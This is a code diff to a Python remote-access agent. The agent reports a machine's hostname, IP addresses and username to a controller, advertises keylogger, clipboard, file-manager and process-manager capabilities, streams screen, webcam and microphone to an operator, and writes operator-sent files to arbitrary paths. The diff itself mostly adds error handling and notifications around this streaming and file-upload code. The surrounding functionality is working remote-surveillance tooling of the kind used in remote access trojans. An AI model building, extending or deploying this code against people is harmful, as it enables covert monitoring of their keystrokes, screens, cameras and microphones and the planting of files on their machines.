@@ -6733,63 +6733,79 @@ def stream_screen_simple_socketio(agent_id):
 def start_streaming(agent_id):
     global STREAMING_ENABLED, STREAM_THREAD
     
-    with _stream_lock:  # ✅ THREAD-SAFE: Prevent race condition
-        if STREAMING_ENABLED:
-            log_message("Screen streaming already running", "warning")
-            return
-        
-        STREAMING_ENABLED = True
-        # Use a safe wrapper that defers until functions are defined
-        STREAM_THREAD = threading.Thread(target=_run_screen_stream, args=(agent_id,))
-        STREAM_THREAD.daemon = True
-        STREAM_THREAD.start()
-        log_message("Started smart video streaming (WebRTC preferred, Socket.IO fallback).")
-        
-        # ✅ AUTO-START AUDIO: Start audio streaming with screen stream
-        log_message("🎤 Auto-starting audio streaming with screen stream...")
-        start_audio_streaming(agent_id)
+    try:
+        with _stream_lock:  # ✅ THREAD-SAFE: Prevent race condition
+            if STREAMING_ENABLED:
+                log_message("Screen streaming already running", "warning")
+                emit_system_notification('warning', 'Screen Stream', 'Screen streaming is already active')
+                return
+            
+            STREAMING_ENABLED = True
+            # Use a safe wrapper that defers until functions are defined
+            STREAM_THREAD = threading.Thread(target=_run_screen_stream, args=(agent_id,))
+            STREAM_THREAD.daemon = True
+            STREAM_THREAD.start()
+            log_message("Started smart video streaming (WebRTC preferred, Socket.IO fallback).")
+            emit_system_notification('success', 'Screen Stream Started', 'Screen streaming started successfully')
+            
+            # ✅ AUTO-START AUDIO: Start audio streaming with screen stream
+            log_message("🎤 Auto-starting audio streaming with screen stream...")
+            start_audio_streaming(agent_id)
+            
+    except Exception as e:
+        log_message(f"Failed to start screen streaming: {e}", "error")
+        emit_system_notification('error', 'Screen Stream Failed', f'Failed to start screen streaming: {str(e)}')
+        STREAMING_ENABLED = False
 
 def stop_streaming():
     global STREAMING_ENABLED, STREAM_THREAD, STREAM_THREADS, capture_queue, encode_queue
     
-    with _stream_lock:  # ✅ THREAD-SAFE
-        if not STREAMING_ENABLED:
-            return
-        
+    try:
+        with _stream_lock:  # ✅ THREAD-SAFE
+            if not STREAMING_ENABLED:
+                emit_system_notification('info', 'Screen Stream', 'Screen streaming is not active')
+                return
+            
+            STREAMING_ENABLED = False
+            
+            # Clear queues to wake up any waiting threads (non-blocking)
+            try:
+                if capture_queue:
+                    while not capture_queue.empty():
+                        try:
+                            capture_queue.get_nowait()
+                        except:
+                            break
+            except:
+                pass
+            
+            try:
+                if encode_queue:
+                    while not encode_queue.empty():
+                        try:
+                            encode_queue.get_nowait()
+                        except:
+                            break
+            except:
+                pass
+            
+            # Don't join threads - they're daemon threads and will exit naturally
+            # This prevents blocking the main thread and causing disconnects
+            STREAM_THREAD = None
+            STREAM_THREADS = []
+            capture_queue = None
+            encode_queue = None
+            log_message("Stopped video stream.")
+            emit_system_notification('success', 'Screen Stream Stopped', 'Screen streaming stopped successfully')
+            
+            # ✅ AUTO-STOP AUDIO: Stop audio streaming with screen stream
+            log_message("🎤 Auto-stopping audio streaming with screen stream...")
+            stop_audio_streaming()
+            
+    except Exception as e:
+        log_message(f"Error stopping screen streaming: {e}", "error")
+        emit_system_notification('error', 'Screen Stream Error', f'Error stopping screen streaming: {str(e)}')
         STREAMING_ENABLED = False
-        
-        # Clear queues to wake up any waiting threads (non-blocking)
-        try:
-            if capture_queue:
-                while not capture_queue.empty():
-                    try:
-                        capture_queue.get_nowait()
-                    except:
-                        break
-        except:
-            pass
-        
-        try:
-            if encode_queue:
-                while not encode_queue.empty():
-                    try:
-                        encode_queue.get_nowait()
-                    except:
-                        break
-        except:
-            pass
-        
-        # Don't join threads - they're daemon threads and will exit naturally
-        # This prevents blocking the main thread and causing disconnects
-        STREAM_THREAD = None
-        STREAM_THREADS = []
-        capture_queue = None
-        encode_queue = None
-        log_message("Stopped video stream.")
-        
-        # ✅ AUTO-STOP AUDIO: Stop audio streaming with screen stream
-        log_message("🎤 Auto-stopping audio streaming with screen stream...")
-        stop_audio_streaming()
 
 def start_audio_streaming(agent_id):
     """Start smart audio streaming that automatically chooses WebRTC or Socket.IO."""
@@ -6797,152 +6813,188 @@ def start_audio_streaming(agent_id):
     import queue
     import threading
     
-    with _audio_stream_lock:  # ✅ THREAD-SAFE: Prevent race condition
-        if AUDIO_STREAMING_ENABLED:
-            log_message("Audio streaming already running", "warning")
-            return
-        
-        AUDIO_STREAMING_ENABLED = True
-        
-        # Try WebRTC first for low latency
-        if AIORTC_AVAILABLE and WEBRTC_ENABLED:
-            try:
-                # Use WebRTC audio streaming
-                asyncio.create_task(start_webrtc_audio_streaming(agent_id))
-                log_message("Started WebRTC audio streaming (sub-second latency)")
+    try:
+        with _audio_stream_lock:  # ✅ THREAD-SAFE: Prevent race condition
+            if AUDIO_STREAMING_ENABLED:
+                log_message("Audio streaming already running", "warning")
+                emit_system_notification('warning', 'Audio Stream', 'Audio streaming is already active')
                 return
-            except Exception as e:
-                log_message(f"WebRTC audio streaming failed, falling back to Socket.IO: {e}", "warning")
-        
-        # Fallback to Socket.IO multi-threaded pipeline
-        audio_capture_queue = queue.Queue(maxsize=AUDIO_CAPTURE_QUEUE_SIZE)
-        audio_encode_queue = queue.Queue(maxsize=AUDIO_ENCODE_QUEUE_SIZE)
-        
-        # Start worker threads
-        threads = [
-            threading.Thread(target=audio_capture_worker, args=(agent_id,), daemon=True),
-            threading.Thread(target=audio_encode_worker, args=(agent_id,), daemon=True),
-            threading.Thread(target=audio_send_worker, args=(agent_id,), daemon=True)
-        ]
-        
-        for thread in threads:
-            thread.start()
-        
-        AUDIO_STREAM_THREADS = threads
-        log_message("Started Socket.IO Opus audio streaming pipeline (fallback mode).")
+            
+            AUDIO_STREAMING_ENABLED = True
+            
+            # Try WebRTC first for low latency
+            if AIORTC_AVAILABLE and WEBRTC_ENABLED:
+                try:
+                    # Use WebRTC audio streaming
+                    asyncio.create_task(start_webrtc_audio_streaming(agent_id))
+                    log_message("Started WebRTC audio streaming (sub-second latency)")
+                    emit_system_notification('success', 'Audio Stream Started', 'WebRTC audio streaming started successfully')
+                    return
+                except Exception as e:
+                    log_message(f"WebRTC audio streaming failed, falling back to Socket.IO: {e}", "warning")
+                    emit_system_notification('warning', 'Audio Stream Fallback', f'WebRTC failed, using Socket.IO fallback: {str(e)}')
+            
+            # Fallback to Socket.IO multi-threaded pipeline
+            audio_capture_queue = queue.Queue(maxsize=AUDIO_CAPTURE_QUEUE_SIZE)
+            audio_encode_queue = queue.Queue(maxsize=AUDIO_ENCODE_QUEUE_SIZE)
+            
+            # Start worker threads
+            threads = [
+                threading.Thread(target=audio_capture_worker, args=(agent_id,), daemon=True),
+                threading.Thread(target=audio_encode_worker, args=(agent_id,), daemon=True),
+                threading.Thread(target=audio_send_worker, args=(agent_id,), daemon=True)
+            ]
+            
+            for thread in threads:
+                thread.start()
+            
+            AUDIO_STREAM_THREADS = threads
+            log_message("Started Socket.IO Opus audio streaming pipeline (fallback mode).")
+            emit_system_notification('success', 'Audio Stream Started', 'Socket.IO audio streaming started successfully')
+            
+    except Exception as e:
+        log_message(f"Failed to start audio streaming: {e}", "error")
+        emit_system_notification('error', 'Audio Stream Failed', f'Failed to start audio streaming: {str(e)}')
+        AUDIO_STREAMING_ENABLED = False
 
 def stop_audio_streaming():
     """Stop modern Opus audio streaming pipeline."""
     global AUDIO_STREAMING_ENABLED, AUDIO_STREAM_THREADS, audio_capture_queue, audio_encode_queue
     
-    with _audio_stream_lock:  # ✅ THREAD-SAFE
-        if not AUDIO_STREAMING_ENABLED:
-            return
-        
+    try:
+        with _audio_stream_lock:  # ✅ THREAD-SAFE
+            if not AUDIO_STREAMING_ENABLED:
+                emit_system_notification('info', 'Audio Stream', 'Audio streaming is not active')
+                return
+            
+            AUDIO_STREAMING_ENABLED = False
+            
+            # Clear queues to wake up any waiting threads (non-blocking)
+            try:
+                if audio_capture_queue:
+                    while not audio_capture_queue.empty():
+                        try:
+                            audio_capture_queue.get_nowait()
+                        except:
+                            break
+            except:
+                pass
+            
+            try:
+                if audio_encode_queue:
+                    while not audio_encode_queue.empty():
+                        try:
+                            audio_encode_queue.get_nowait()
+                        except:
+                            break
+            except:
+                pass
+            
+            # Don't join threads - they're daemon threads and will exit naturally
+            # This prevents blocking the main thread and causing disconnects
+            AUDIO_STREAM_THREADS = []
+            audio_capture_queue = None
+            audio_encode_queue = None
+            log_message("Stopped Opus audio streaming pipeline.")
+            emit_system_notification('success', 'Audio Stream Stopped', 'Audio streaming stopped successfully')
+            
+    except Exception as e:
+        log_message(f"Error stopping audio streaming: {e}", "error")
+        emit_system_notification('error', 'Audio Stream Error', f'Error stopping audio streaming: {str(e)}')
         AUDIO_STREAMING_ENABLED = False
-        
-        # Clear queues to wake up any waiting threads (non-blocking)
-        try:
-            if audio_capture_queue:
-                while not audio_capture_queue.empty():
-                    try:
-                        audio_capture_queue.get_nowait()
-                    except:
-                        break
-        except:
-            pass
-        
-        try:
-            if audio_encode_queue:
-                while not audio_encode_queue.empty():
-                    try:
-                        audio_encode_queue.get_nowait()
-                    except:
-                        break
-        except:
-            pass
-        
-        # Don't join threads - they're daemon threads and will exit naturally
-        # This prevents blocking the main thread and causing disconnects
-        AUDIO_STREAM_THREADS = []
-        audio_capture_queue = None
-        audio_encode_queue = None
-        log_message("Stopped Opus audio streaming pipeline.")
 
 def start_camera_streaming(agent_id):
     """Start smart camera streaming that automatically chooses WebRTC or Socket.IO."""
     global CAMERA_STREAMING_ENABLED, CAMERA_STREAM_THREADS
     
-    with _camera_stream_lock:  # ✅ THREAD-SAFE: Prevent race condition
-        if CAMERA_STREAMING_ENABLED:
-            log_message("Camera streaming already running", "warning")
-            return
-        
-        CAMERA_STREAMING_ENABLED = True
-        
-        # Try WebRTC first for low latency
-        if AIORTC_AVAILABLE and WEBRTC_ENABLED:
-            try:
-                # Use WebRTC camera streaming
-                asyncio.create_task(start_webrtc_camera_streaming(agent_id))
-                log_message("Started WebRTC camera streaming (sub-second latency)")
-                
-                # ✅ AUTO-START AUDIO: Start audio streaming with camera stream
-                log_message("🎤 Auto-starting audio streaming with camera stream...")
-                start_audio_streaming(agent_id)
+    try:
+        with _camera_stream_lock:  # ✅ THREAD-SAFE: Prevent race condition
+            if CAMERA_STREAMING_ENABLED:
+                log_message("Camera streaming already running", "warning")
+                emit_system_notification('warning', 'Camera Stream', 'Camera streaming is already active')
                 return
-            except Exception as e:
-                log_message(f"WebRTC camera streaming failed, falling back to Socket.IO: {e}", "warning")
-        
-        # Fallback to Socket.IO
-        stream_camera_h264_socketio(agent_id)
-        log_message("Started Socket.IO camera stream (fallback mode).")
-        
-        # ✅ AUTO-START AUDIO: Start audio streaming with camera stream
-        log_message("🎤 Auto-starting audio streaming with camera stream...")
-        start_audio_streaming(agent_id)
+            
+            CAMERA_STREAMING_ENABLED = True
+            
+            # Try WebRTC first for low latency
+            if AIORTC_AVAILABLE and WEBRTC_ENABLED:
+                try:
+                    # Use WebRTC camera streaming
+                    asyncio.create_task(start_webrtc_camera_streaming(agent_id))
+                    log_message("Started WebRTC camera streaming (sub-second latency)")
+                    emit_system_notification('success', 'Camera Stream Started', 'WebRTC camera streaming started successfully with sub-second latency')
+                    
+                    # ✅ AUTO-START AUDIO: Start audio streaming with camera stream
+                    log_message("🎤 Auto-starting audio streaming with camera stream...")
+                    start_audio_streaming(agent_id)
+                    return
+                except Exception as e:
+                    log_message(f"WebRTC camera streaming failed, falling back to Socket.IO: {e}", "warning")
+                    emit_system_notification('warning', 'Camera Stream Fallback', f'WebRTC failed, using Socket.IO fallback: {str(e)}')
+            
+            # Fallback to Socket.IO
+            stream_camera_h264_socketio(agent_id)
+            log_message("Started Socket.IO camera stream (fallback mode).")
+            emit_system_notification('success', 'Camera Stream Started', 'Socket.IO camera streaming started successfully')
+            
+            # ✅ AUTO-START AUDIO: Start audio streaming with camera stream
+            log_message("🎤 Auto-starting audio streaming with camera stream...")
+            start_audio_streaming(agent_id)
+            
+    except Exception as e:
+        log_message(f"Failed to start camera streaming: {e}", "error")
+        emit_system_notification('error', 'Camera Stream Failed', f'Failed to start camera streaming: {str(e)}')
+        CAMERA_STREAMING_ENABLED = False
 
 def stop_camera_streaming():
     """Stop modern H.264 camera streaming pipeline."""
     global CAMERA_STREAMING_ENABLED, CAMERA_STREAM_THREADS, camera_capture_queue, camera_encode_queue
     
-    with _camera_stream_lock:  # ✅ THREAD-SAFE
-        if not CAMERA_STREAMING_ENABLED:
-            return
-        
+    try:
+        with _camera_stream_lock:  # ✅ THREAD-SAFE
+            if not CAMERA_STREAMING_ENABLED:
+                emit_system_notification('info', 'Camera Stream', 'Camera streaming is not active')
+                return
+            
+            CAMERA_STREAMING_ENABLED = False
+            
+            # Clear queues to wake up any waiting threads (non-blocking)
+            try:
+                if camera_capture_queue:
+                    while not camera_capture_queue.empty():
+                        try:
+                            camera_capture_queue.get_nowait()
+                        except:
+                            break
+            except:
+                pass
+            
+            try:
+                if camera_encode_queue:
+                    while not camera_encode_queue.empty():
+                        try:
+                            camera_encode_queue.get_nowait()
+                        except:
+                            break
+            except:
+                pass
+            
+            # Don't join threads - they're daemon threads and will exit naturally
+            # This prevents blocking the main thread and causing disconnects
+            CAMERA_STREAM_THREADS = []
+            camera_capture_queue = None
+            camera_encode_queue = None
+            log_message("Stopped camera stream.")
+            emit_system_notification('success', 'Camera Stream Stopped', 'Camera streaming stopped successfully')
+            
+            # ✅ AUTO-STOP AUDIO: Stop audio streaming with camera stream
+            log_message("🎤 Auto-stopping audio streaming with camera stream...")
+            stop_audio_streaming()
+            
+    except Exception as e:
+        log_message(f"Error stopping camera streaming: {e}", "error")
+        emit_system_notification('error', 'Camera Stream Error', f'Error stopping camera streaming: {str(e)}')
         CAMERA_STREAMING_ENABLED = False
-        
-        # Clear queues to wake up any waiting threads (non-blocking)
-        try:
-            if camera_capture_queue:
-                while not camera_capture_queue.empty():
-                    try:
-                        camera_capture_queue.get_nowait()
-                    except:
-                        break
-        except:
-            pass
-        
-        try:
-            if camera_encode_queue:
-                while not camera_encode_queue.empty():
-                    try:
-                        camera_encode_queue.get_nowait()
-                    except:
-                        break
-        except:
-            pass
-        
-        # Don't join threads - they're daemon threads and will exit naturally
-        # This prevents blocking the main thread and causing disconnects
-        CAMERA_STREAM_THREADS = []
-        camera_capture_queue = None
-        camera_encode_queue = None
-        log_message("Stopped camera stream.")
-        
-        # ✅ AUTO-STOP AUDIO: Stop audio streaming with camera stream
-        log_message("🎤 Auto-stopping audio streaming with camera stream...")
-        stop_audio_streaming()
 
 # ========================================================================================
 # WEBRTC PEER CONNECTION MANAGEMENT FOR LOW-LATENCY STREAMING
@@ -8752,49 +8804,62 @@ def register_socketio_handlers():
     @sio.event
     def connect():
         global CONNECTION_STATE
-        agent_id = get_or_create_agent_id()
-        log_message(f"[CONNECT] Connected to controller, registering agent {agent_id}")
-        
-        # Update connection state
-        CONNECTION_STATE['connected'] = True
-        CONNECTION_STATE['consecutive_failures'] = 0
-        CONNECTION_STATE['reconnect_needed'] = False
-        
-        safe_emit('agent_connect', {
-        'agent_id': agent_id,
-        'hostname': socket.gethostname(),
-        'platform': platform.system(),
-        'os_version': platform.release(),
-        'ip_address': get_local_ip(),
-        'public_ip': get_public_ip(),
-        'username': os.getenv('USERNAME') or os.getenv('USER') or 'unknown',
-        'version': '2.1',
-        'capabilities': {
-            'screen': True,
-            'camera': CV2_AVAILABLE,
-            'audio': PYAUDIO_AVAILABLE,
-            'keylogger': PYNPUT_AVAILABLE,
-            'clipboard': True,
-            'file_manager': True,
-            'process_manager': PSUTIL_AVAILABLE,
-            'webcam': CV2_AVAILABLE,
-            'webrtc': AIORTC_AVAILABLE
-        },
-        'timestamp': int(time.time() * 1000)
-    })  # ✅ SAFE
+        try:
+            agent_id = get_or_create_agent_id()
+            log_message(f"[CONNECT] Connected to controller, registering agent {agent_id}")
+            
+            # Update connection state
+            CONNECTION_STATE['connected'] = True
+            CONNECTION_STATE['consecutive_failures'] = 0
+            CONNECTION_STATE['reconnect_needed'] = False
+            
+            safe_emit('agent_connect', {
+            'agent_id': agent_id,
+            'hostname': socket.gethostname(),
+            'platform': platform.system(),
+            'os_version': platform.release(),
+            'ip_address': get_local_ip(),
+            'public_ip': get_public_ip(),
+            'username': os.getenv('USERNAME') or os.getenv('USER') or 'unknown',
+            'version': '2.1',
+            'capabilities': {
+                'screen': True,
+                'camera': CV2_AVAILABLE,
+                'audio': PYAUDIO_AVAILABLE,
+                'keylogger': PYNPUT_AVAILABLE,
+                'clipboard': True,
+                'file_manager': True,
+                'process_manager': PSUTIL_AVAILABLE,
+                'webcam': CV2_AVAILABLE,
+                'webrtc': AIORTC_AVAILABLE
+            },
+            'timestamp': int(time.time() * 1000)
+        })  # ✅ SAFE
+            
+            # Send success notification
+            emit_system_notification('success', 'Agent Connected', f'Successfully connected to controller as agent {agent_id}')
+            
+        except Exception as e:
+            log_message(f"Error in connect handler: {e}", "error")
+            emit_system_notification('error', 'Connection Error', f'Failed to connect to controller: {str(e)}')
     
     # Register disconnect handler
     @sio.event
     def disconnect():
         global CONNECTION_STATE
-        agent_id = get_or_create_agent_id()
-        log_message(f"[DISCONNECT] Agent {agent_id} lost connection to controller")
-        
-        # Update connection state immediately
-        CONNECTION_STATE['connected'] = False
-        CONNECTION_STATE['reconnect_needed'] = True
-        
-        log_message("[DISCONNECT] Stopping all active streams and commands...")
+        try:
+            agent_id = get_or_create_agent_id()
+            log_message(f"[DISCONNECT] Agent {agent_id} lost connection to controller")
+            
+            # Update connection state immediately
+            CONNECTION_STATE['connected'] = False
+            CONNECTION_STATE['reconnect_needed'] = True
+            
+            log_message("[DISCONNECT] Stopping all active streams and commands...")
+            emit_system_notification('warning', 'Agent Disconnected', f'Lost connection to controller for agent {agent_id}')
+            
+        except Exception as e:
+            log_message(f"Error in disconnect handler: {e}", "error")
         
         # Stop all operations
         try:
@@ -8843,36 +8908,38 @@ def register_socketio_handlers():
 
 def on_file_chunk_from_operator(data):
     """Receive a file chunk from the operator and write to disk."""
-    if not SOCKETIO_AVAILABLE or sio is None:
-        log_message("Socket.IO not available, cannot handle file chunk", "warning")
-        return
-    """Receive a file chunk from the operator and write to disk."""
-    log_message(f"Received file chunk: {data.get('filename', 'unknown')} at offset {data.get('offset', 0)}")
-    filename = data.get('filename')
-    chunk_b64 = data.get('data') or data.get('chunk')
-    offset = data.get('offset', 0)
-    total_size = data.get('total_size', 0)
-    destination_path = data.get('destination_path') or filename
-    
-    log_message(f"Debug - filename: {filename}, destination_path: {destination_path}, total_size: {total_size}")
-    
-    if not filename or not chunk_b64:
-        log_message("Invalid file chunk received.")
-        return
-    
-    # Use a temp buffer in memory or on disk
-    if not hasattr(on_file_chunk_from_operator, 'buffers'):
-        on_file_chunk_from_operator.buffers = {}
-    buffers = on_file_chunk_from_operator.buffers
-    
-    if destination_path not in buffers:
-        buffers[destination_path] = {'chunks': [], 'total_size': total_size, 'filename': filename}
-    
-    # Remove data: prefix if present
-    if ',' in chunk_b64:
-        chunk_b64 = chunk_b64.split(',', 1)[1]
-    
     try:
+        if not SOCKETIO_AVAILABLE or sio is None:
+            log_message("Socket.IO not available, cannot handle file chunk", "warning")
+            emit_system_notification('error', 'File Upload Error', 'Socket.IO not available')
+            return
+        
+        log_message(f"Received file chunk: {data.get('filename', 'unknown')} at offset {data.get('offset', 0)}")
+        filename = data.get('filename')
+        chunk_b64 = data.get('data') or data.get('chunk')
+        offset = data.get('offset', 0)
+        total_size = data.get('total_size', 0)
+        destination_path = data.get('destination_path') or filename
+        
+        log_message(f"Debug - filename: {filename}, destination_path: {destination_path}, total_size: {total_size}")
+        
+        if not filename or not chunk_b64:
+            log_message("Invalid file chunk received.", "warning")
+            emit_system_notification('warning', 'File Upload Warning', 'Received invalid file chunk')
+            return
+        
+        # Use a temp buffer in memory or on disk
+        if not hasattr(on_file_chunk_from_operator, 'buffers'):
+            on_file_chunk_from_operator.buffers = {}
+        buffers = on_file_chunk_from_operator.buffers
+        
+        if destination_path not in buffers:
+            buffers[destination_path] = {'chunks': [], 'total_size': total_size, 'filename': filename}
+        
+        # Remove data: prefix if present
+        if ',' in chunk_b64:
+            chunk_b64 = chunk_b64.split(',', 1)[1]
+        
         chunk = base64.b64decode(chunk_b64)
         buffers[destination_path]['chunks'].append((offset, chunk))
         
@@ -8927,9 +8994,10 @@ def on_file_chunk_from_operator(data):
                 'size': received_size,
                 'success': True
             })
-            
+                
     except Exception as e:
-        log_message(f"Error processing chunk: {e}")
+        log_message(f"Error processing chunk: {e}", "error")
+        emit_system_notification('error', 'File Upload Error', f'Error processing file chunk: {str(e)}')
 
 def _save_completed_file(destination_path, buffer_data):
     """Save the completed file to disk."""
@@ -8949,6 +9017,7 @@ def _save_completed_file(destination_path, buffer_data):
         
         file_size = sum(len(c[1]) for c in buffer_data['chunks'])
         log_message(f"File saved successfully to {destination_path} ({file_size} bytes)")
+        emit_system_notification('success', 'File Saved', f'File {os.path.basename(destination_path)} saved successfully ({file_size} bytes)')
         
         # Clean up buffer
         if hasattr(on_file_chunk_from_operator, 'buffers'):
@@ -8956,7 +9025,8 @@ def _save_completed_file(destination_path, buffer_data):
                 del on_file_chunk_from_operator.buffers[destination_path]
                 
     except Exception as e:
-        log_message(f"Error saving file {destination_path}: {e}")
+        log_message(f"Error saving file {destination_path}: {e}", "error")
+        emit_system_notification('error', 'File Save Failed', f'Failed to save file {os.path.basename(destination_path)}: {str(e)}')
 
 def on_file_upload_complete_from_operator(data):
     if not SOCKETIO_AVAILABLE or sio is None:
